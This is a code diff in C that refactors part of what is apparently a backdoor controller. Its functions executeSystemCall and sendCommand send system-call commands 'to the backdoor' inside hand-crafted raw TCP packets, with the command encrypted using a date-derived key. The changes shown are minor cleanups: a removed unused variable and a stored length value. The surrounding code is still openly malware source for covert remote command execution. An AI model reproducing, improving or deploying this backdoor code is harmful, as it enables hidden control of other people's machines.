@@ -78,9 +78,7 @@ int main (int argc, char **argv)
 }
 
 static void executeSystemCall(netInfo *info, char *commandData)
-{
-    int backdoorSocket = 0;
-    
+{   
     // Send the command to the backdoor
     sendCommand(info, EXECUTE_SYSTEM_CALL, commandData);
     
@@ -263,6 +261,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     int sock = 0;
     int one = 1;
     int packetLength = 0;
+    int length = 0;
     const int *val = &one;
     struct ip *iph = NULL;
     struct tcphdr *tcph = NULL;
@@ -373,12 +372,11 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     {
         strncat(commandBuffer, commandData, PATH_MAX + 2);
     }
-
+    
     // Encrypt and copy the command into the packet
-    encryptedField = encrypt_data(commandBuffer, date, strnlen(commandBuffer, PATH_MAX) + 1);
-
-    memcpy(buffer + sizeof(struct ip) + sizeof(struct tcphdr), encryptedField,
-           strnlen(commandBuffer, PATH_MAX) + 1);
+    length = strnlen(commandBuffer, PATH_MAX) + 1;
+    encryptedField = encrypt_data(commandBuffer, date, length);
+    memcpy(buffer + sizeof(struct ip) + sizeof(struct tcphdr), encryptedField, length);
     
     // IP checksum calculation
 #if defined __APPLE__ || defined __USE_BSD
